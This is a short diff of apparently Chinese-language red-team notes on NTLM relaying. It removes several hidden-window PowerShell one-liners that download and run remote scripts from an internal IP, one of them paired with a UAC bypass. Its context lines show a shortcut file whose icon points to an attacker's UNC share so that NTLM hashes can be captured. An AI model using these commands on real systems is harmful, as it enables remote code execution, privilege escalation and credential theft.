@@ -240,12 +240,6 @@ kali起一个py服务器，监听8080端口
 
 ## NTLM Relaying
 
-powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"
-
-
-powershell.exe  -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"
-
- runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
 整个攻击的操作流程图见这里：
 
@@ -321,4 +315,3 @@ $shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
 $shortcut.IconLocation = "\\10.10.17.231\test.ico"
 $shortcut.Save()
 ```
-powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"
